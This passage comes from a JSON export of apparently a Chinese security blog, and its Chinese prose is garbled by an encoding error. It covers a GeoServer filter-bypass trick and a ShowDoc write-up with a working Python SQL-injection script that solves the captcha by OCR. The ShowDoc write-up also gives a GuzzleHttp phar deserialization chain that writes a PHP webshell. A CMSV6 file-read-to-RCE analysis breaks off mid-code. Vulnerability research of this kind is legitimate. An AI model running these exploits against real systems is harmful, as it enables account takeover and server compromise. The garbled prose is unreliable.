åè¯ç›¸æ¯”è¾ƒå…¶ä»–åˆ©ç”¨è¿˜æ˜¯è§‰å¾—GetPropertyçš„åˆ©ç”¨æ¯”è¾ƒèˆ’æœï¼Œä¸åƒGetFeatureä¹‹ç±»çš„é‡Œé¢åˆ°å¤„éƒ½æ˜¯è§¦å‘ç‚¹ï¼Œä¼šå¯¼è‡´xpathè¢«è§£æå¾ˆå¤šæ¬¡ï¼Œå½“ç„¶pocå°±ä¸è´´äº†å­¦ä¹ æ€è·¯ä¸ºä¸»ï¼Œåœ¨GetPropertyä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„å¯¹æŠ—æµé‡è®¾å¤‡çš„ç‚¹ åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨è·å–å‚æ•°æ—¶ä¼šæŠŠ[]ä¸­çš„å†…å®¹æ›¿æ¢ä¸ºç©ºï¼Œä½†å¾ˆå¯æƒœæ˜¯è´ªå©ªåŒ¹é…(è‡³å°‘æˆ‘è¿™ä¸ªè€ä»£ç æ˜¯è¿™æ ·çš„)ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥æ‹¿æ¥åšä¸€äº›åˆ©ç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„java.lang.Runtimeå¯ä»¥å†™æˆjava.lang.Ru[Hacked By Y4]ntime 1PropertyName propertyNameNoIndexes = this.filterFactory.property(request.getValueReference().replaceAll(&quot;\\\\[.*\\\\]&quot;, &quot;&quot;), this.getNamespaceSupport()); ä¾ç„¶æ˜¯å¯ä»¥è§¦å‘çš„ å‡Œæ™¨äº†ï¼Œæ´—æ´—ç¡äº†â€¦ å‚è€ƒé“¾æ¥https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"GeoServer","slug":"GeoServer","permalink":"https://y4tacker.github.io/tags/GeoServer/"}]},{"title":"ShowDocV3.2.5æœ€æ–°ç‰ˆSQLæ³¨å…¥åŠè€ç‰ˆæœ¬ååºåˆ—åŒ–åˆ†æ","slug":"year/2024/5/ShowDocV3-2-5æœ€æ–°ç‰ˆSQLæ³¨å…¥åŠè€ç‰ˆæœ¬ååºåˆ—åŒ–åˆ†æ","date":"2024-05-28T09:43:33.000Z","updated":"2024-06-04T14:10:56.000Z","comments":true,"path":"2024/05/28/year/2024/5/ShowDocV3-2-5æœ€æ–°ç‰ˆSQLæ³¨å…¥åŠè€ç‰ˆæœ¬ååºåˆ—åŒ–åˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2024/05/28/year/2024/5/ShowDocV3-2-5%E6%9C%80%E6%96%B0%E7%89%88SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%80%81%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"ShowDocV3.2.5æœ€æ–°ç‰ˆSQLæ³¨å…¥åŠè€ç‰ˆæœ¬ååºåˆ—åŒ–åˆ†ææ³¨å…¥ä»æäº¤è®°å½•æˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€äº›æç¤º https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30#diff-b4363835fc1321f859d1faaad5a5a283db695849ca98c4e949fbf1bed8c84a31 é¦–å…ˆé¦–å½“å…¶å†²ï¼Œç¬¬ä¸€è¡Œå…ˆæ˜¯å°†å‡½æ•°new_is_writeableæƒé™æ”¹ä¸ºprivateï¼Œè¿™åº”è¯¥æ˜¯ä½œè€…ä¸€å¼€å§‹çš„å¤±è¯¯ï¼ˆè¿™ä¸ªå‡½æ•°åœ¨å…¶ä»–åœ°æ–¹éƒ½æœ‰å‡ºç°ä¸”éƒ½æ˜¯privateä¿®é¥°ï¼Œä»…ä»…åœ¨è¿™é‡Œæ˜¯publicï¼‰ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨èªæ˜ä¸€ç‚¹çœ‹äº†æŸæ­¥çš„é€šå‘Šéƒ½çŸ¥é“åº”è¯¥èƒ½çŒœåˆ°å’Œpharååºåˆ—åŒ–æœ‰å…³ å…¶åçœ‹å…¶ä»–ä¿®æ”¹çš„åœ°æ–¹æˆ–è®¸ä½ ä¼šæ„Ÿåˆ°å¾ˆæ‡µé€¼ï¼Œä¼¼ä¹éƒ½ä¸æ³¨å…¥æ²¡å…³ç³»ï¼Œä»”ç»†çœ‹çŒœæµ‹åº”è¯¥æ˜¯æ¶æ„ä»£ç æ–¹é¢çš„å˜åŠ¨ï¼Œä»ä¸€äº›ç»†èŠ‚ä¹Ÿèƒ½çœ‹åˆ°å…¶å®æ”¹åŠ¨æŒºç³™çš„ï¼Œä½†çœ‹èµ·æ¥æ”¹äº†å¾ˆä¹…ã€‚ çœ‹éå‰å°åŠŸèƒ½çš„ä»£ç åä¼šå‘ç°æ³¨å…¥ç‚¹éå¸¸ç®€å•,https://github.com/star7th/showdoc/blob/5b6b095899b71af7728a8371c668bb288ccfd1e9/server/Application/Api/Controller/ItemController.class.php#L577ï¼Œåœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°item_idå…¶å®æ˜¯æ²¡æœ‰åšç±»å‹è½¬æ¢ï¼Œåé¢çš„ä»£ç ä¸­`$item = D(â€œItemâ€)-&gt;where(â€œitem_id = â€˜$item_idâ€™ â€œ)-&gt;find();`item_idç›´æ¥åšäº†æ‹¼æ¥(å¤šè¯´ä¸€ä¸‹è¦æƒ³é˜²æ­¢æ³¨å…¥åº”è¯¥ä½¿ç”¨å‰é¢ä»£ç ä¸­çš„æ•°ç»„çš„æ–¹å¼å®ç°å‚æ•°ç»‘å®š) 123456789101112131415161718192021222324252627282930313233343536373839public function pwd()&#123; $item_id = I(&quot;item_id&quot;); $page_id = I(&quot;page_id/d&quot;); $password = I(&quot;password&quot;); $refer_url = I(&#x27;refer_url&#x27;); $captcha_id = I(&quot;captcha_id&quot;); $captcha = I(&quot;captcha&quot;); if (!D(&quot;Captcha&quot;)-&gt;check($captcha_id, $captcha)) &#123; $this-&gt;sendError(10206, L(&#x27;verification_code_are_incorrect&#x27;)); return; &#125; if (!is_numeric($item_id)) &#123; $item_domain = $item_id; &#125; //åˆ¤æ–­ä¸ªæ€§åŸŸå if ($item_domain) &#123; $item = D(&quot;Item&quot;)-&gt;where(&quot;item_domain = &#x27;%s&#x27;&quot;, array($item_domain))-&gt;find(); if ($item[&#x27;item_id&#x27;]) &#123; $item_id = $item[&#x27;item_id&#x27;]; &#125; &#125; if ($page_id &gt; 0) &#123; $page = M(&quot;Page&quot;)-&gt;where(&quot; page_id = &#x27;$page_id&#x27; &quot;)-&gt;find(); if ($page) &#123; $item_id = $page[&#x27;item_id&#x27;]; &#125; &#125; $item = D(&quot;Item&quot;)-&gt;where(&quot;item_id = &#x27;$item_id&#x27; &quot;)-&gt;find(); if ($password &amp;&amp; $item[&#x27;password&#x27;] == $password) &#123; session(&quot;visit_item_&quot; . $item_id, 1); $this-&gt;sendResult(array(&quot;refer_url&quot; =&gt; base64_decode($refer_url))); &#125; else &#123; $this-&gt;sendError(10010, L(&#x27;access_password_are_incorrect&#x27;)); &#125;&#125; å¦å¤–åœ¨åˆ©ç”¨æ—¶ä¼šå—éªŒè¯ç çš„å½±å“ï¼Œå½“ç„¶ç”±äºç”Ÿæˆçš„éªŒè¯ç å…¶å®æ˜¯éå¸¸ç®€å•çš„ï¼Œæ ¹æ®ä»¥ä¸Šé€»è¾‘æˆ‘ä»¬å¾ˆå®¹æ˜“å¾—åˆ°éªŒè¯è„šæœ¬ï¼Œåœ¨ä»¥ä¸‹è„šæœ¬ä¸­åªè¦è¿”å›&#123;&quot;error_code&quot;:0,&quot;data&quot;:&#123;&quot;refer_url&quot;:&quot;Hacked By Y4tacker&quot;&#125;&#125;å³åˆ©ç”¨æˆåŠŸ(æœ¬ç¯‡ä»¥Mysqlç¯å¢ƒåšåˆ†æï¼ŒSQLiteç±»ä¼¼ä¸åšè¿‡å¤šé‡å¤å·¥ä½œ) 12345678910111213141516171819202122import ddddocrimport requestsocr = ddddocr.DdddOcr()sess = requests.session()pre_url = &quot;http://xxx:1235&quot;def capture(): captcha_id = sess.get(pre_url + &quot;/server/index.php?s=/api/common/createCaptcha&quot;).json()[&#x27;data&#x27;][&#x27;captcha_id&#x27;] captcha = sess.get(pre_url + f&quot;/server/index.php?s=/api/common/showCaptcha&amp;captcha_id=&#123;captcha_id&#125;&quot;).content captcha_code = ocr.classification(captcha) return captcha_id, captcha_codecaptcha_id, captcha_code = capture()r = sess.get( url=f&quot;http://xxxx:1235/server/index.php?s=/Api/Item/pwd&amp;captcha_id=&#123;captcha_id&#125;&amp;captcha=&#123;captcha_code&#125;&amp;item_id=y4&#x27;) union select 1,2,3,4,5,6,7,8,9,10,11,12--&amp;password=6&amp;refer_url=SGFja2VkIEJ5IFk0dGFja2Vy&amp;1716885664000&quot;).textprint(r) åœ¨ååˆ©ç”¨çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è¡¨user_tokenï¼Œå…¶ä¸­å­˜äº†tokenå­—æ®µ è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„å­—æ®µï¼Œåœ¨å¾ˆå¤šå‡½æ•°ä¸­éƒ½ä¼šç”¨åˆ°checkLoginæ¥åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“tokené‚£ä¹ˆå°±èƒ½ç›´æ¥ç™»å½•ä»»æ„ç”¨æˆ·äº† 123456789101112131415161718192021222324public function checkLogin($redirect = true)&#123; if (!session(&quot;login_user&quot;)) &#123; $user_token = I(&quot;user_token&quot;) ? I(&quot;user_token&quot;) : cookie(&#x27;cookie_token&#x27;); $user_token = $user_token ? $user_token : $_REQUEST[&#x27;user_token&#x27;]; if ($user_token) &#123; $ret = D(&quot;UserToken&quot;)-&gt;getToken($user_token); if ($ret &amp;&amp; $ret[&#x27;token_expire&#x27;] &gt; time()) &#123; D(&quot;UserToken&quot;)-&gt;setLastTime($user_token); $login_user = D(&quot;User&quot;)-&gt;where(&quot;uid = $ret[uid]&quot;)-&gt;find(); unset($ret[&#x27;password&#x27;]); session(&quot;login_user&quot;, $login_user); return $login_user; &#125; &#125; if ($redirect) &#123; $this-&gt;sendError(10102); exit(); &#125; &#125; else &#123; return session(&quot;login_user&quot;); &#125;&#125; V &lt; 3.2.5 ååºåˆ—åŒ–é¦–å…ˆæ—¢ç„¶æ˜¯TPçš„æ¡†æ¶é‚£ä¹ˆé¦–å½“å…¶å†²æˆ‘ä»¬å°±å¯ä»¥å…ˆçœ‹çœ‹ThinkPHPçš„ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰åˆé€‚çš„ç‰ˆæœ¬é‚£ä¹ˆç›´æ¥å°±å¯ä»¥æ‹¿æ¥ç”¨äº† åœ¨https://github.com/star7th/showdoc/blob/v3.2.4/server/ThinkPHP/ThinkPHP.phpä¸­æˆ‘ä»¬ä¸éš¾å‘ç°ç‰ˆæœ¬å±…ç„¶æ˜¯`3.2.3`ï¼Œçœ‹åˆ°è¿™ä¸ªè€ç‰ˆæœ¬å·å°±çŸ¥é“æƒ³é€šè¿‡TPçš„ååºåˆ—åŒ–ç›´æ¥RCEä¸å¤ªç°å®äº†ï¼Œä½†æˆ‘ä»¬ä¸å¿…æ²®ä¸§ï¼Œè¿™ä¸ªç³»ç»Ÿæœ‰composeråŒ…ç®¡ç†ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥çœ‹çœ‹èƒ½ä¸èƒ½é€šè¿‡ç¬¬ä¸‰æ–¹ä¾èµ–å®ç°ååºåˆ—åŒ–åˆ°RCEçš„æ•ˆæœ https://github.com/star7th/showdoc/tree/v3.2.4/server/vendor å½“ç„¶ç­”æ¡ˆæ˜¯YESï¼Œåœ¨è®¿é—®åæˆ‘ä»¬ä¸€çœ¼èƒ½çœ‹åˆ°ä¸€ä¸ªè€æœ‹å‹GuzzleHttpï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ç°æˆçš„é“¾å­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace GuzzleHttp\\Cookie&#123; class SetCookie &#123; private static $defaults = [ &#x27;Name&#x27; =&gt; null, &#x27;Value&#x27; =&gt; null, &#x27;Domain&#x27; =&gt; null, &#x27;Path&#x27; =&gt; &#x27;/&#x27;, &#x27;Max-Age&#x27; =&gt; null, &#x27;Expires&#x27; =&gt; null, &#x27;Secure&#x27; =&gt; false, &#x27;Discard&#x27; =&gt; false, &#x27;HttpOnly&#x27; =&gt; false ]; function __construct() &#123; $this-&gt;data[&#x27;Expires&#x27;] = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;data[&#x27;Discard&#x27;] = 0; &#125; &#125; class CookieJar&#123; private $cookies = []; private $strictMode; function __construct() &#123; $this-&gt;cookies[] = new SetCookie(); &#125; &#125; class FileCookieJar extends CookieJar &#123; private $filename; private $storeSessionCookies; function __construct() &#123; parent::__construct(); $this-&gt;filename = &quot;y4tacker.php&quot;; $this-&gt;storeSessionCookies = true; &#125; &#125;&#125;namespace&#123; $pop = new \\GuzzleHttp\\Cookie\\FileCookieJar(); $phar = new \\Phar(&quot;y4tacker.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&#x27;GIF89a&#x27;.&quot;__HALT_COMPILER();&quot;); $phar-&gt;setMetadata($pop); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();&#125; ä¹‹ååœ¨åå°ä¸Šä¼ æ–‡ä»¶å¾—åˆ°æ–‡ä»¶ååï¼Œå°±èƒ½è®¿é—®/server/index.php?s=/home/index/new_is_writeable&amp;file=phar://../Public/Uploads/xxxx-xx-xx/xx.pngè§¦å‘ååºåˆ—åŒ–å®ç°webshellå†™å…¥ åè¯æ­£å¦‚å¼€ç¯‡è¯´çš„é‚£èˆ¬ï¼Œæ­¤æ¬¡æäº¤ä»…ä»…åªä¿®å¤äº†ååºåˆ—åŒ–è§¦å‘çš„ç‚¹ï¼Œå¹¶æ²¡æœ‰ä¿®å¤sqlæ³¨å…¥ä¹Ÿå°±å¯¼è‡´äº†æ–°ç‰ˆä¾ç„¶æš´éœ²åœ¨è¢«æ”»å‡»çš„é£é™©å½“ä¸­ ä»Šå¤©å†çœ‹ç»ˆäºè¢«ä¿®å¤äº†:https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fdaï¼Œå¯ä»¥å®‰å¿ƒåˆ é™¤åšå®¢å¯†ç äº†","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ShowDoc","slug":"ShowDoc","permalink":"https://y4tacker.github.io/tags/ShowDoc/"}]},{"title":"æµ…æé€šå¤©æ˜ŸCMSV6è½¦è½½å®šä½ç›‘æ§å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","slug":"year/2024/5/æµ…æé€šå¤©æ˜ŸCMSV6è½¦è½½å®šä½ç›‘æ§å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","date":"2024-05-18T13:28:19.000Z","updated":"2024-05-23T09:18:08.000Z","comments":true,"path":"2024/05/18/year/2024/5/æµ…æé€šå¤©æ˜ŸCMSV6è½¦è½½å®šä½ç›‘æ§å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/","link":"","permalink":"https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"æµ…æé€šå¤©æ˜ŸCMSV6è½¦è½½å®šä½ç›‘æ§å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å†™åœ¨å‰é¢çœ‹äº†ä¸€ä¸‹é€šå‘Šçœ‹ç€è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œé€šå¤©æ˜ŸCMSV6è½¦è½½å®šä½ç›‘æ§å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ ç¬¬ä¸€æ­¥æ˜¯é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè¯»å–logæ—¥å¿—è·å–adminçš„sessionä¿¡æ¯ ç¬¬äºŒæ­¥é€šè¿‡é»˜è®¤å¯†ç ç™»å½•ftpæœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶(æˆ–é€šè¿‡åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´) ç¬¬ä¸‰æ­¥è§¦å‘ä¸Šä¼ æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç  æ­£æ–‡é‡‡ç”¨äº†ç»å…¸SSHæ¶æ„ ä»»æ„æ–‡ä»¶è¯»å–å…³äºä»»æ„æ–‡ä»¶è¯»å–ï¼Œä»å®˜æ–¹å®‰å…¨å…¬å‘Šä¹Ÿä¸éš¾çœ‹å‡º: (ä¸­å±)ä¿®å¤StandardSchoolBusAction_downLoad.actionæ¥å£ä»»æ„æ–‡ä»¶ä¸‹è½½é—®é¢˜ æ¼æ´ç‚¹ä½äºStandardSchoolBusActionçš„downLoadåŠŸèƒ½ï¼Œè¿™éƒ¨åˆ†è®¿é—®è§„åˆ™çš„é…ç½®çœ‹struts2.xmlå³å¯ å®šä¹‰äº†classä¸mothodçš„è®¿é—®æ–¹å¼ 1&lt;action name=&quot;**/*_*.action&quot; class=&quot;&#123;2&#125;&quot; method=&quot;&#123;3&#125;&quot;&gt; ç»è¿‡ç®€å•çš„åˆ†æå‘ç°ï¼Œå®é™…æ¼æ´ç‚¹åœ¨com.gpsCommon.action.CommonBaseAction#downLoadï¼Œä»£ç é€»è¾‘æ¯”è¾ƒç®€å•å°±ä¸è¯¦ç»†åˆ†æäº†ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¯»å–çš„æ–‡ä»¶ä¸ä»…å¯ä»¥æ˜¯ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¯»å–ä»»æ„æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899public String downLoad() &#123; int result = 0; try &#123; String filePath = this.getDownloadFileRealPath(this.getRequest()); if ((!filePath.contains(&quot;tomcat/&quot;) || filePath.contains(&quot;tomcat/ttxapps&quot;)) &amp;&amp; !filePath.contains(&quot;.xml&quot;) &amp;&amp; !filePath.contains(&quot;WEB-INF&quot;) &amp;&amp; !filePath.contains(&quot;classes&quot;)) &#123; if (!AssertUtils.isNull(filePath)) &#123; InputStream ins = null; BufferedInputStream bins = null; OutputStream outs = null; BufferedOutputStream bouts = null; Integer requestStringEx = this.getRequestInteger(&quot;isTure&quot;); Integer isStream = this.getRequestInteger(&quot;isStream&quot;); Integer isDel = this.getRequestInteger(&quot;isDel&quot;); String fileRealPath = null; if (requestStringEx != null &amp;&amp; requestStringEx == 1) &#123; fileRealPath = filePath; &#125; else &#123; fileRealPath = this.getDownloadFileRealPath(this.getServletContext(), filePath); &#125; File file = new File(fileRealPath); if (file.exists()) &#123; ins = new FileInputStream(fileRealPath); bins = new BufferedInputStream(ins); outs = this.getResponse().getOutputStream(); bouts = new BufferedOutputStream(outs); if (isStream == null || isStream != 1) &#123; this.setDownLoadParam(this.getRequest(), this.getResponse(), file.getName()); &#125; int b = false; byte[] buffer = new byte[512]; int b; while((b = bins.read(buffer)) != -1) &#123; bouts.write(buffer, 0, b); &#125; bouts.flush(); ins.close(); bins.close(); outs.close(); bouts.close(); if (isDel != null &amp;&amp; isDel == 1 &amp;&amp; file.exists()) &#123; file.delete(); &#125; &#125; else &#123; result = 44; this.addCustomResponse(ACTION_RESULT, 44); this.addCustomResponse(ACTION_RESULT_TIP, &quot;File Not Exist!&quot;); this.log.error(&quot;ä¸‹è½½çš„æ–‡ä»¶ä¸å­˜åœ¨&quot;); &#125; &#125; else &#123; result = 8; this.addCustomResponse(ACTION_RESULT, 8); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Request Param Error!&quot;); this.log.error(&quot;ä¸‹è½½æ–‡ä»¶æ—¶å‚æ•°é”™è¯¯&quot;); &#125; &#125; else &#123; result = 24; this.addCustomResponse(ACTION_RESULT, 24); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Permission denied!&quot;); this.log.error(&quot;ç”¨æˆ·æ— æƒé™ä¸‹è½½Tomcatå†…çš„æ–‡ä»¶&quot;); &#125; &#125; catch (Exception var14) &#123; this.log.error(var14.getMessage(), var14); result = 4; this.addCustomResponse(ACTION_RESULT, 4); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Request Exception!&quot;); &#125; return this.getReturnParam(result);&#125;protected String getDownloadFileRealPath(HttpServletRequest request) &#123; return this.getRequestStringEx(&quot;path&quot;);&#125;public String getRequestStringEx(String parameter) &#123; return RequestUtil.getRequestStringEx(parameter);&#125;public static String getRequestStringEx(String parameter) &#123; try &#123; HttpServletRequest request = getRequest(); if (request == null) &#123; return null; &#125; else &#123; request.setCharacterEncoding(&quot;UTF-8&quot;); String param = request.getParameter(parameter); return param != null ? URLDecoder.decode(param, StandardCharsets.UTF_8) : null; &#125; &#125; catch (Exception var3) &#123; log.error(var3.getMessage(), var3); return null; &#125;&#125; é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“è¯»å–åˆ°sessionä¿¡æ¯ å¦å¤–å¤šæä¸€å˜´ï¼Œæ¼æ´ç‚¹com.gpsCommon.action.CommonBaseAction#downLoadåœ¨æŠ½è±¡ç±»å½“ä¸­ï¼Œé€šè¿‡å°†tomcatä¸‹classæ‰‹åŠ¨æ‰“åŒ…ä¸ºjarååˆ†æï¼Œä¸éš¾å‘ç°å®é™…å—å½±å“çš„è·¯ç”±å¤šè¾¾320ä¸ªï¼Œå› æ­¤å®é™…åˆ©ç”¨æ—¶æˆ‘ä»¬ä¸å¿…æ‹˜æ³¥ä¸å®˜æ–¹å…¬å‘Šæåˆ°çš„ä¸€ç§ åå°æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§é€šè¿‡FTPæœåŠ¡ï¼Œå¦‚æœç”¨æˆ·ä¸ºæ›´æ”¹é»˜è®¤å¯†ç é‚£ä¹ˆå³å¯ä½¿ç”¨å…¶ç™»å½•ä¸Šä¼ æ–‡ä»¶ å¦ä¸€ç§ï¼Œæ—¢ç„¶æœ‰äº†sessionï¼Œæˆ‘ä»¬ä¾¿å¾ˆå®¹æ˜“èƒ½å¤Ÿä½¿ç”¨æ­¤sessionè°ƒç”¨åå°æ¥å£ï¼Œæ¯”å¦‚WebuploaderAction#ajaxAttachAllFileUpload ä½†å¾ˆå¯æƒœçš„æ˜¯ä»£ç ä¸­æœ‰å…³äºä¸Šä¼ æ–‡ä»¶åç¼€çš„ä¸¥æ ¼é™åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å®ç°ç›´æ¥ä¸Šä¼ webshellæ–‡ä»¶ 12String getsuffix = getsuffixEx(fileName);if (!limitType(getsuffix)) &#123; ååºåˆ—åŒ–ä½†æˆ‘ä»¬ä¸å¿…ç°å¿ƒï¼Œåœ¨å…¬å‘Šä¸­æˆ‘ä»¬ä¸éš¾å‘ç°ä¸Šä¼ äº†ä¸€äº›åä¸ºjasperåç¼€çš„æ–‡ä»¶ å› æ­¤æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾åŠ è½½æ¶æ„jasperæ–‡ä»¶çš„è·¯ç”±ï¼Œåœ¨com.gps808.operationManagement.action.StandardLineAction#report 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576public void report() &#123; try &#123; String format = this.getRequestString(&quot;format&quot;); String name = this.getRequestString(&quot;name&quot;); String lid = this.getRequestString(&quot;id&quot;); String direct = this.getRequestString(&quot;direct&quot;); String disposition = this.getRequestString(&quot;disposition&quot;); String reportTitle = &quot;&quot;; StandardCompany line = (StandardCompany)this.standardLineService.getObject(StandardCompany.class, Integer.parseInt(lid)); if (line != null) &#123; reportTitle = line.getName(); if (direct != null) &#123; if (direct.equals(&quot;0&quot;)) &#123; reportTitle = reportTitle + &quot;S&quot;; &#125; else if (direct.equals(&quot;1&quot;)) &#123; reportTitle = reportTitle + &quot;X&quot;; &#125; &#125; &#125; AjaxDto&lt;StandardLineStationRelationStation&gt; stationRelation = this.standardLineService.getLineStationInfos(Integer.parseInt(lid), Integer.parseInt(direct), 1, &quot; order by sindex asc &quot;, (Pagination)null); List&lt;Map&gt; list = new ArrayList(); String language = this.getAndUpdateSessionLanguage(); if (stationRelation != null &amp;&amp; stationRelation.getPageList() != null) &#123; int i = 0; for(int j = stationRelation.getPageList().size(); i &lt; j; ++i) &#123; StandardLineStationRelationStation relation = (StandardLineStationRelationStation)stationRelation.getPageList().get(i); Map map = new HashMap(); map.put(&quot;sindex&quot;, relation.getSindex()); map.put(&quot;name&quot;, relation.getStation().getName()); map.put(&quot;direct&quot;, this.getStationDirectEx(relation.getStation().getDirect(), language)); map.put(&quot;stype&quot;, this.getStationTypeEx(relation.getStype(), language)); map.put(&quot;lngIn&quot;, GpsUtil.formatPosition(relation.getStation().getLngIn())); map.put(&quot;latIn&quot;, GpsUtil.formatPosition(relation.getStation().getLatIn())); map.put(&quot;angleIn&quot;, relation.getStation().getAngleIn()); map.put(&quot;speed&quot;, GpsUtil.getFormatSpeed(relation.getSpeed(), 1, new Boolean[0])); map.put(&quot;len&quot;, GpsUtil.getFormatLiCheng(relation.getLen())); list.add(map); &#125; &#125; Map mapHeads = new HashMap(); mapHeads.put(&quot;sindex&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_index&quot;, language)); mapHeads.put(&quot;name&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_name&quot;, language)); mapHeads.put(&quot;direct&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_direction&quot;, language)); mapHeads.put(&quot;stype&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_type&quot;, language)); mapHeads.put(&quot;lngIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_lng&quot;, language)); mapHeads.put(&quot;latIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_lat&quot;, language)); mapHeads.put(&quot;angleIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_angle&quot;, language)); mapHeads.put(&quot;speed&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_limit_speed&quot;, language) + &quot; (KM/H)&quot;); mapHeads.put(&quot;len&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_distance&quot;, language) + &quot; (KM)&quot;); ReportPrint print = null; try &#123; print = this.getReportCreate().createReport(name); print.setMapHeads(mapHeads); print.setReportTitle(reportTitle); print.setDateSource(list); print.setFormat(format); print.setDocumentName(name); print.setDisposition(disposition); print.exportReport(); &#125; catch (IOException var15) &#123; this.log.error(var15.getMessage(), var15); &#125; catch (ServletException var16) &#123; this.log.error(var16.getMessage(), var16); &#125; catch (Exception var17) &#123; this.log.error(var17.getMessage(), var17); &#125; &#125; catch (Exception var18) &#123; this.log.error(var18.getMessage(), var18); this.addCustomResponse(ACTION_RESULT, 1); &#125;&#125; åœ¨è¿™äº›ä»£ç ä¸­æˆ‘ä»¬é‡ç‚¹å…³æ³¨this.getReportCreate().createReport(name); 12345678910111213141516171819// com.gpsCommon.action.CommonBaseActionprotected ReportCreater getReportCreate() &#123; if (this.reportCreate == null) &#123; this.reportCreate = new ReportCreater(); this.reportCreate.setJasperReportPath(ServletActionContext.getServletContext().getRealPath(&quot;WEB-INF\\\\jasper&quot;)); &#125; return this.reportCreate;&#125;// com.framework.jasperReports.ReportCreater#createReportpublic ReportPrint createReport(String reportKey) throws IOException &#123; try &#123; return this._createReport(reportKey); &#125; catch (JRException var3) &#123; this.log.error(var3.getMessage(), var3); throw new IOException(); &#125;&#125; ç»§ç»­è·Ÿè¿›_createReportçš„è°ƒç”¨ï¼Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// com.framework.jasperReports.ReportCreaterprivate ReportPrint _createReport(String reportKey) throws JRException, IOException &#123; JasperReport jasperReport = this.getJasperReport(reportKey); Map parameters = this.getParameters_(reportKey); ReportPrint reportPrint = new ReportPrint(jasperReport, parameters); return reportPrint;&#125;private JasperReport getJasperReport(String reportKey) throws IOException, JRException &#123; JasperReport jasperReport = null; if (this.jasperDesignMap.containsKey(reportKey)) &#123; jasperReport = (JasperReport)this.jasperDesignMap.get(reportKey); &#125; else &#123; jasperReport = this.getJasperReportFromFile(reportKey); this.jasperDesignMap.put(reportKey, jasperReport); &#125; return jasperReport;&#125;private 